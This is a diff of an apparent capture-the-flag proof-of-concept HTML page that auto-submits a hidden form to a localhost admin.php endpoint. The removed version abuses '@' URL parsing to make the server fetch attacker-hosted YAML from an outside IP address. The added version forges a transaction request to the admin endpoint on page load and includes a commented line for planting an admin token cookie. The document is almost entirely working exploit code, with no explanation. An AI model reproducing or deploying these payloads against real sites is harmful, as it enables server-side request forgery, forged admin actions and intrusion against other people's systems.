@@ -1,8 +1,37 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>ctf poc</title>
-<form id="f" method="post" action="http://localhost:5000/admin.php">
-  <!-- after '@' MUST be an HTTP endpoint that returns the YAML below (status 200, no redirects) -->
-  <input type="hidden" name="url" value="http://localhost:5000/admin.php@75.119.143.38:8001/y.yaml">
-</form>
-<script>f.submit();</script>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>CTF autosubmit → /admin.php</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+</head>
+<body>
+  <!-- Optional: if you know the admin token and you're NOT on 127.0.0.1, set it here -->
+  <!-- <script>document.cookie = "token=PUT_ADMIN_TOKEN_HERE; path=/;";</script> -->
+
+  <form id="pwn" method="POST" action="http://localhost:5000/admin.php">
+    <input type="hidden" name="url" id="urlField" value="">
+  </form>
+
+  <script>
+    (function () {
+      // Build a GET to /admin.php that triggers simulate_transactions()
+      // Two transactions: BUY 1 USD, then SELL 1 USD (valid and leaves balance intact).
+      const params = new URLSearchParams();
+      params.set("transactions[0][amount]", "1");
+      params.set("transactions[0][country]", "United States");
+      params.set("transactions[1][amount]", "1");
+      params.set("transactions[1][country]", "United States");
+
+      // Must start with the exact URL_PREFIX
+      const simUrl = "http://localhost:5000/admin.php?" + params.toString();
+
+      // Put that URL into the POST body as `url`, which process_transactions() expects
+      document.getElementById("urlField").value = simUrl;
+
+      // Auto-submit the POST
+      document.getElementById("pwn").submit();
+    })();
+  </script>
+</body>
+</html>
